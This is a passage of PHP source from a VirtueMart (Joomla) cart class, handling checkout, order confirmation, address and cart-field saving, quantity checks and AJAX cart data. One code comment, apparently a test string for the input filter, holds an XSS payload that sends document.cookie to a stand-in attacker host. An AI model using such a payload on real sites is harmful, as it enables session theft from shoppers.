						return $this->redirecter('index.php?option=com_virtuemart&view=cart&task=editpayment' , $redirectMsg);
						// 	NOTE: inactive plugins will always return null, so that value cannot be used for anything else!
					}
				}
			}
		}
		//$this->_inCheckOut = false;
		//Show cart and checkout data overview
		if($this->_redirected){
			$this->_redirected = false;
		} else {
			$this->_inCheckOut = false;
		}

		if($this->_blockConfirm){
			$this->_dataValidated = false;
			$this->_inCheckOut = false;
			$this->setCartIntoSession(true);
			return $this->redirecter('index.php?option=com_virtuemart&view=cart'.$layoutName,'');
		} else {
			$this->_dataValidated = true;
			$this->setCartIntoSession(true);
			if ($this->_redirect) {
				$mainframe = JFactory::getApplication();
				$mainframe->redirect(JRoute::_('index.php?option=com_virtuemart&view=cart'.$layoutName, FALSE), vmText::_('COM_VIRTUEMART_CART_CHECKOUT_DONE_CONFIRM_ORDER'));
			} else {
				return true;
			}
		}
	}

	/**
	 * Check if a minimum purchase value for this order has been set, and if so, if the current
	 * value is equal or hight than that value.
	 * @author Oscar van Eijk
	 * @return An error message when a minimum value was set that was not eached, null otherwise
	 */
	private function checkPurchaseValue() {

		$this->prepareVendor();
		if ($this->vendor->vendor_min_pov > 0) {
			$prices = $this->getCartPrices();
			if ($prices['salesPrice'] < $this->vendor->vendor_min_pov) {
				if (!class_exists('CurrencyDisplay'))
				require(JPATH_VM_ADMINISTRATOR . DS . 'helpers' . DS . 'currencydisplay.php');
				$currency = CurrencyDisplay::getInstance();
				return vmText::sprintf('COM_VIRTUEMART_CART_MIN_PURCHASE', $currency->priceDisplay($this->vendor->vendor_min_pov));
			}
		}
		return null;
	}

	/**
	 * Test userdata if valid
	 *
	 * @author Max Milbers
	 * @param String if BT or ST
	 * @param Object If given, an object with data address data that must be formatted to an array
	 * @return redirectMsg, if there is a redirectMsg, the redirect should be executed after
	 */
	private function validateUserData($type='BT', $obj = null,$redirect = false) {

		if($obj==null){
			$obj = $this->{$type};
		}

		$usersModel = VmModel::getModel('user');
		return $usersModel->validateUserData($obj,$type,$redirect);

	}

	/**
	 * This function is called, when the order is confirmed by the shopper.
	 *
	 * Here are the last checks done by payment plugins.
	 * The mails are created and send to vendor and shopper
	 * will show the orderdone page (thank you page)
	 *
	 */
	function confirmedOrder() {

		//Just to prevent direct call
		if ($this->_dataValidated and $this->_confirmDone and !$this->_inCheckOut) {

			if($this->_inConfirm) return false;

			//We set this in the trigger of the plugin. so old plugins keep the old behaviour
			//$this->_inConfirm = true;
			//$this->setCartIntoSession(false,true);

			$orderModel = VmModel::getModel('orders');

			if(!$this->virtuemart_order_id){
				if (($this->virtuemart_order_id = $orderModel->createOrderFromCart($this)) === false) {
					$mainframe = JFactory::getApplication();
					vmError('No order created '.$orderModel->getError());
					$mainframe->redirect(JRoute::_('index.php?option=com_virtuemart&view=cart', FALSE) );
				}
			}

			$orderDetails = $orderModel ->getMyOrderDetails($this->virtuemart_order_id);

			if(!$orderDetails or empty($orderDetails['details'])){
				echo vmText::_('COM_VIRTUEMART_CART_ORDER_NOTFOUND');
				return;
			}

			$orderModel->notifyCustomer($this->virtuemart_order_id, $orderDetails);

			$dispatcher = JDispatcher::getInstance();

			JPluginHelper::importPlugin('vmcalculation');
			JPluginHelper::importPlugin('vmcustom');
			JPluginHelper::importPlugin('vmshipment');
			JPluginHelper::importPlugin('vmpayment');

			$returnValues = $dispatcher->trigger('plgVmConfirmedOrder', array($this, $orderDetails));

			// may be redirect is done by the payment plugin (eg: paypal)
			// if payment plugin echos a form, false = nothing happen, true= echo form ,
			// 1 = cart should be emptied, 0 cart should not be emptied
			//$this->_inConfirm = false;
			$this->setCartIntoSession(false,true);

			return $this->virtuemart_order_id;
		}
	}

	/**
	 * emptyCart: Used for payment handling.
	 *
	 * @author Valerie Cartan Isaksen
	 *
	 */
	public function emptyCart(){
		self::emptyCartValues($this);
	}

	/**
	 * emptyCart: Used for payment handling.
	 *
	 * @author Valerie Cartan Isaksen
	 *
	 */
	static public function emptyCartValues(&$cart){

		//VmConfig::$echoDebug=true;

		//We delete the old stuff
		$cart->products = array();
		$cart->cartProductsData = array();
		$cart->cartData = array();
		$cart->cartPrices = array();
		$cart->cartfields = array();
		$cart->_inCheckOut = false;
		$cart->_dataValidated = false;
		$cart->_confirmDone = false;
		$cart->couponCode = '';
		$cart->order_language = '';
		$cart->virtuemart_shipmentmethod_id = 0; //OSP 2012-03-14
		$cart->virtuemart_paymentmethod_id = 0;
		$cart->order_number=null;
		$cart->_fromCart = false;
		$cart->_inConfirm = false;
		$cart->totalProduct=false;
		$cart->productsQuantity=array();
		$cart->virtuemart_order_id = null;
		//vmdebug('emptyCartValues',$cart);
		$cart->deleteCart();
		$cart->setCartIntoSession(false,true);

	}

	function saveCartFieldsInCart(){

		if (!class_exists('VirtueMartModelUserfields'))
			require(JPATH_VM_ADMINISTRATOR . DS . 'models' . DS . 'userfields.php');
		$userFieldsModel = VmModel::getModel('userfields');

		$cartFields = $userFieldsModel->getUserFields(
			'cart'
			, array('delimiters' => true, 'captcha' => true, 'system' => false)
			, array('delimiter_userinfo', 'name','username', 'password', 'password2', 'address_type_name', 'address_type', 'user_is_vendor', 'agreed'));

		if(!class_exists('vmFilter'))require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'vmfilter.php');
		foreach ($cartFields as $fld) {
			if(!empty($fld->name)){
				$name = $fld->name;
				if(!isset($data[$name])){

					if($fld->type=='checkbox'){
						$tmp = vRequest::getInt($name,false);
						if($tmp){
							$data[$name] = $tmp;
						}
					} else {
						$tmp = vRequest::getString($name,false);
						if($tmp){
							$data[$name] = $tmp;
						}
					}

				}

				//Lets filter it, test string
	//öäü?ß<script>alert("attacked")</script> <a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">My Name</a>
				if(isset($data[$name])){
					if(!empty($data[$name])){
						$data[$name] = htmlspecialchars ($data[$name],ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8',false);
						$data[$name] = (string)preg_replace('#on[a-z](.+?)\)#si','',$data[$name]);//replace start of script onclick() onload()...
					}

					$this->cartfields[$name] = $data[$name];
					vmdebug('Store $this->cartfields[$name] '.$name.' '.$data[$name]);
				}
			}
		}

		$this->setCartIntoSession();
	}

	function saveAddressInCart($data, $type, $putIntoSession = true,$prefix='') {

		// VirtueMartModelUserfields::getUserFields() won't work
		if(!class_exists('VirtueMartModelUserfields')) require(JPATH_VM_ADMINISTRATOR.DS.'models'.DS.'userfields.php' );
		$userFieldsModel = VmModel::getModel('userfields');

		if ($type == 'STaddress' or $type == 'BTaddress'){
			vmTrace('STaddress found, seek and destroy');
		}
		$prepareUserFields = $userFieldsModel->getUserFieldsFor('cart',$type);

		if(!is_array($data)){
			$data = get_object_vars($data);
		}

		if ($type =='ST') {
			$this->STsameAsBT = 0;
		} else { // BT

			if(empty($data['email'])){
				$jUser = JFactory::getUser();
				$address['email'] = $jUser->email;
			}

		}

		$address = array();
		if(!class_exists('vmFilter'))require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'vmfilter.php');
		foreach ($prepareUserFields as $fld) {
			if(!empty($fld->name)){
				$name = $fld->name;

				if(!isset($data[$prefix.$name])){
					$tmp = vRequest::getString($prefix.$name,false);
					if($tmp){
						$data[$prefix.$name] = $tmp;
					}
					else if($fld->required and isset($this->{$type}[$name])){	//Why we have this fallback to the already stored value?
						$data[$prefix.$name] = $this->{$type}[$name];
					}
					/*if($fld->type=='text'){
					} else {
						vmdebug('my fld ',$fld);
					}*/
				}

				if(isset($data[$prefix.$name])){
					if(!empty($data[$prefix.$name])){

						$value = vmFilter::hl( $data[$prefix.$name],array('deny_attribute'=>'*'));
						//to strong
						/* $value = preg_replace('@<[\/\!]*?[^<>]*?>@si','',$value);//remove all html tags  */
						//lets use instead
						$value = JComponentHelper::filterText($value);
						$value = (string)preg_replace('#on[a-z](.+?)\)#si','',$value);//replace start of script onclick() onload()...
						$value = trim(str_replace('"', ' ', $value),"'") ;
						$data[$prefix.$name] = (string)preg_replace('#^\'#si','',$value);
					}
					$address[$name] = $data[$prefix.$name];
				} else {
					vmdebug('Data not found for type '.$type.' and name '.$prefix.$name.' ');
				}
			}
		}

		//dont store passwords in the session
		unset($address['password']);
		unset($address['password2']);

		$this->{$type} = $address;

		if($putIntoSession){
			$this->setCartIntoSession(true);
		}

	}

	/**
	 * @author Valérie Isaksen, Max Milbers
	 * @param $type
	 * @return bool
	 */
	function checkAutomaticSelectedPlug($type){

		$vm_method_name = 'virtuemart_'.$type.'method_id';
		if (count($this->products) == 0 or  VmConfig::get('automatic_'.$type,'1')!='1') {
			vmdebug('CheckAutomaticSelectedShipment cart has shipmentmethod id ! ',$this->$vm_method_name);
			return false;
		}

		if (!class_exists('vmPSPlugin')) {
			require(JPATH_VM_PLUGINS . DS . 'vmpsplugin.php');
		}

		$counter=0;
		$dispatcher = JDispatcher::getInstance();
		$returnValues = $dispatcher->trigger('plgVmOnCheckAutomaticSelected'.ucfirst($type), array(  $this,$this->cartPrices, &$counter));

		$nb = 0;
		$method_id = 0;
		foreach ($returnValues as $returnValue) {
			if ( isset($returnValue )) {
				$nb ++;
				if ($returnValue) $method_id = $returnValue;
			}
		}
		
		$vm_autoSelected_name = 'automaticSelected'.ucfirst($type);
		if ($nb==1 && $method_id) {
			$this->$vm_method_name = $method_id;
			$this->$vm_autoSelected_name=true;
			$this->setCartIntoSession();
			vmdebug('FOUND automatic SELECTED '.$type.' !!',$this->$vm_method_name);
			return true;
		} else {
			$this->$vm_autoSelected_name=false;
			return false;
		}

	}

	/*
	 * CheckAutomaticSelectedShipment
	* If only one shipment is available for this amount, then automatically select it
	* @deprecated
	* @author Valérie Isaksen
	*/
	function CheckAutomaticSelectedShipment() {
		return $this->checkAutomaticSelectedPlug('shipment');
	}

	/*
	 * CheckAutomaticSelectedPayment
	* If only one payment is available for this amount, then automatically select it
	* @deprecated
	* @author Valérie Isaksen
	*/
	function CheckAutomaticSelectedPayment() {
		return $this->checkAutomaticSelectedPlug('payment');
	}

	/**
	 * Function Description
	 *
	 * @author Max Milbers
	 * @access public
	 * @param array $cart the cart to get the products for
	 * @return array of product objects
	 */

	public function getCartPrices($force=false) {

		if(empty($this->cartPrices) or count($this->cartPrices<8) or $force){
			if(!class_exists('calculationHelper')) require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'calculationh.php');
			$calculator = calculationHelper::getInstance();

			$this->pricesCurrency = $calculator->_currencyDisplay->getCurrencyForDisplay();

			$calculator->getCheckoutPrices($this);

			//Fallback for old extensions
			$this->pricesUnformatted = $this->cartPrices;

			//We must do this here, otherwise if we have a product more than one time in the cart
			//it has always the same price
			foreach($this->products as $k => $product){
				$this->products[$k]->prices = &$product->allPrices[$product->selectedPrice];
			}
		}
	}

	function prepareVendor(){
		if(empty($this->vendor)){
			$vendorModel = VmModel::getModel('vendor');
			$this->vendor = $vendorModel->getVendor($this->vendorId);
			$vendorModel->addImages($this->vendor,1);
			if (VmConfig::get('enable_content_plugin', 0)) {
				shopFunctionsF::triggerContentPlugin($this->vendor, 'vendor','vendor_terms_of_service');
			}
		}
	}

	function prepareCartData($checkAutomaticSelected=true){

		$this->totalProduct = 0;
		if(count($this->products) != count($this->cartProductsData) or $this->_productAdded){
			$productsModel = VmModel::getModel('product');
			$this->totalProduct = 0;
			$this->productsQuantity = array();
			//vmdebug('$this->cartProductsData',$this->cartProductsData);
			$customFieldsModel = VmModel::getModel('customfields');
			foreach($this->cartProductsData as $k =>&$productdata){
				$productdata = (array)$productdata;

				if(isset($productdata['virtuemart_product_id'])){
					if(empty($productdata['virtuemart_product_id']) or empty($productdata['quantity'])){
						unset($this->cartProductsData[$k]);
						continue;
					}
					$productdata['quantity'] = (int)$productdata['quantity'];
					$productTemp = $productsModel->getProduct($productdata['virtuemart_product_id'],TRUE,FALSE,TRUE,$productdata['quantity']);
					if(empty($productTemp->virtuemart_product_id)){
						vmError('prepareCartData virtuemart_product_id is empty','The product is no longer available');
						unset($this->cartProductsData[$k]);
						continue;
					}

					//Very important! must be cloned, else all products with same id get the same productCustomData due the product cache
					$product = clone($productTemp);

					$productdata['virtuemart_product_id'] = (int)$productdata['virtuemart_product_id'];

					$product -> customProductData = $productdata['customProductData'];
					$product -> quantity = $productdata['quantity'];

					// No full link because Mail want absolute path and in shop is better relative path
					$product->url = JRoute::_('index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id='.$product->virtuemart_product_id.'&virtuemart_category_id='.$product->virtuemart_category_id);//JHtml::link($url, $product->product_name);
					$product->cart_item_id = $k ;

					if ( VmConfig::get('oncheckout_show_images')){
						$productsModel->addImages($product,1);
					}

					$product->customfields = $customFieldsModel->getCustomEmbeddedProductCustomFields($product->allIds,0,1);

					$enough = $this->checkForQuantities($product,$product -> quantity);

					if($product->quantity<=0){
						unset($this->cartProductsData[$k]);
						continue;
					}
					$this->products[$k] = $product;
					$this->totalProduct += $product -> quantity;
					$productdata['quantity'] = $product -> quantity;

					if(isset($this->productsQuantity[$product->virtuemart_product_id])){
						$this->productsQuantity[$product->virtuemart_product_id] += $product -> quantity;
					} else {
						$this->productsQuantity[$product->virtuemart_product_id] = $product -> quantity;
					}

					$product = null;
				} else {
					unset($this->cartProductsData[$k]);
					vmError('prepareCartData $productdata[virtuemart_product_id] was empty');
				}
			}
			$this->setCartIntoSession();
		} else {
			//vmdebug('The array count($this->cartProductsData) is 0 ',$this->cartProductsData);
		}

		$this->getCartPrices();

		if(!class_exists('vmPSPlugin')) require(JPATH_VM_PLUGINS.DS.'vmpsplugin.php');
		JPluginHelper::importPlugin('vmpayment');
		$dispatcher = JDispatcher::getInstance();
		$returnValues = $dispatcher->trigger('plgVmgetPaymentCurrency', array( $this->virtuemart_paymentmethod_id, &$this->paymentCurrency));

		$this->_productAdded = false;
		return $this->cartData ;

	}


	/** Checks if the quantity is correct
	 *
	 * @author Max Milbers
	 */
	private function checkForQuantities($product, &$quantity=0) {

		$stockhandle = VmConfig::get('stockhandle','none');
		$mainframe = JFactory::getApplication();
		// Check for a valid quantity
		if (!is_numeric( $quantity)) {
			$errorMsg = vmText::_('COM_VIRTUEMART_CART_ERROR_NO_VALID_QUANTITY', false);
			$this->setError($errorMsg);
			vmInfo($errorMsg,$product->product_name);
			return false;
		}
		// Check for negative quantity
		if ($quantity < 1) {
			$errorMsg = vmText::_('COM_VIRTUEMART_CART_ERROR_NO_VALID_QUANTITY', false);
			$this->setError($errorMsg);
			vmInfo($errorMsg,$product->product_name);
			return false;
		}

		// Check to see if checking stock quantity
		if ($stockhandle!='none' && $stockhandle!='risetime') {

			$productsleft = $product->product_in_stock - $product->product_ordered;

			// TODO $productsleft = $product->product_in_stock - $product->product_ordered - $quantityincart ;
			if ($quantity > $productsleft ){
				vmdebug('my products left '.$productsleft.' and my quantity '.$quantity);
				if($productsleft>0 and ($stockhandle=='disableadd' or $stockhandle=='disableit_children') ){
					$quantity = $productsleft;
					$errorMsg = vmText::sprintf('COM_VIRTUEMART_CART_PRODUCT_OUT_OF_QUANTITY',$quantity);
					$this->setError($errorMsg);
					//vmInfo($errorMsg.' '.$product->product_name);
					// $mainframe->enqueueMessage($errorMsg);
				} else {
					$quantity = 0;
					$errorMsg = vmText::_('COM_VIRTUEMART_CART_PRODUCT_OUT_OF_STOCK');
					$this->setError($errorMsg); // Private error retrieved with getError is used only by addJS, so only the latest is fine
					// todo better key string
					vmInfo($errorMsg. ' '.$product->product_name);
					// $mainframe->enqueueMessage($errorMsg);
					return false;
				}
			}
		}

		// Check for the minimum and maximum quantities
		$min = $product->min_order_level;
		if ($min != 0 && $quantity < $min) {
			$errorMsg = vmText::sprintf('COM_VIRTUEMART_CART_MIN_ORDER', $min);
			$this->setError($errorMsg);
			vmInfo($errorMsg,$product->product_name);
			return false;
		}

		$max = $product->max_order_level;
		if ($max != 0 && $quantity > $max) {
			$errorMsg = vmText::sprintf('COM_VIRTUEMART_CART_MAX_ORDER', $max);
			$this->setError($errorMsg);
			vmInfo($errorMsg,$product->product_name);
			return false;
		}

		$step = $product->step_order_level;
		if ($step != 0 && ($quantity%$step)!= 0) {
			$errorMsg = vmText::sprintf('COM_VIRTUEMART_CART_STEP_ORDER', $step);
			$this->setError($errorMsg);
			vmInfo($errorMsg,$product->product_name);
			return false;
		}
		return true;
	}



	// Render the code for Ajax Cart
	function prepareAjaxData($checkAutomaticSelected=true){

		$this->prepareCartData();
		$data = new stdClass();
		$data->products = array();
		$data->totalProduct = 0;
		//$i=0;
		//OSP when prices removed needed to format billTotal for AJAX
		if (!class_exists('CurrencyDisplay'))
			require(JPATH_VM_ADMINISTRATOR . DS . 'helpers' . DS . 'currencydisplay.php');
		$currencyDisplay = CurrencyDisplay::getInstance();

		foreach ($this->products as $i=>$product){

			$category_id = $this->getCardCategoryId($product->virtuemart_product_id);
			//Create product URL
			$url = JRoute::_('index.php?option=com_virtuemart&view=productdetails&virtuemart_product_id='.$product->virtuemart_product_id.'&virtuemart_category_id='.$category_id, FALSE);

			// @todo Add variants
			$data->products[$i]['product_name'] = JHtml::link($url, $product->product_name);

			if(!class_exists('VirtueMartModelCustomfields'))require(JPATH_VM_ADMINISTRATOR.DS.'models'.DS.'customfields.php');
			//  custom product fields display for cart
			$data->products[$i]['customProductData'] = VirtueMartModelCustomfields::CustomsFieldCartModDisplay($product);

			$data->products[$i]['product_sku'] = $product->product_sku;

			$data->products[$i]['prices'] = $currencyDisplay->priceDisplay( $product->allPrices[$product->selectedPrice]['subtotal']);

			// other possible option to use for display
			$data->products[$i]['subtotal'] = $currencyDisplay->priceDisplay($product->allPrices[$product->selectedPrice]['subtotal']);
			$data->products[$i]['subtotal_tax_amount'] = $currencyDisplay->priceDisplay($product->allPrices[$product->selectedPrice]['subtotal_tax_amount']);
			$data->products[$i]['subtotal_discount'] = $currencyDisplay->priceDisplay( $product->allPrices[$product->selectedPrice]['subtotal_discount']);
			$data->products[$i]['subtotal_with_tax'] = $currencyDisplay->priceDisplay($product->allPrices[$product->selectedPrice]['subtotal_with_tax']);

			// UPDATE CART / DELETE FROM CART
			$data->products[$i]['quantity'] = $product->quantity;
			$data->totalProduct += $product->quantity ;

		}

		if(empty($this->cartPrices['billTotal']) or $this->cartPrices['billTotal'] < 0){
			$this->cartPrices['billTotal'] = 0.0;
		}

		$data->billTotal = $currencyDisplay->priceDisplay( $this->cartPrices['billTotal'] );
		$data->dataValidated = $this->_dataValidated ;

		if ($data->totalProduct>1) $data->totalProductTxt = vmText::sprintf('COM_VIRTUEMART_CART_X_PRODUCTS', $data->totalProduct);
		else if ($data->totalProduct == 1) $data->totalProductTxt = vmText::_('COM_VIRTUEMART_CART_ONE_PRODUCT');
		else $data->totalProductTxt = vmText::_('COM_VIRTUEMART_EMPTY_CART');
		if (false && $data->dataValidated == true) {
			$taskRoute = '&task=confirm';
			$linkName = vmText::_('COM_VIRTUEMART_ORDER_CONFIRM_MNU');
		} else {
			$taskRoute = '';
			$linkName = vmText::_('COM_VIRTUEMART_CART_SHOW');
		}

		$data->cart_show = '<a style ="float:right;" href="'.JRoute::_("index.php?option=com_virtuemart&view=cart".$taskRoute,true,VmConfig::get('useSSL',0)).'" rel="nofollow" >'.$linkName.'</a>';
		//$data->billTotal = vmText::_('COM_VIRTUEMART_CART_TOTAL').' <strong>'. $data->billTotal .'</strong>';
		$data->billTotal = vmText::sprintf('COM_VIRTUEMART_CART_TOTALP',$data->billTotal);
		return $data ;
	}
}
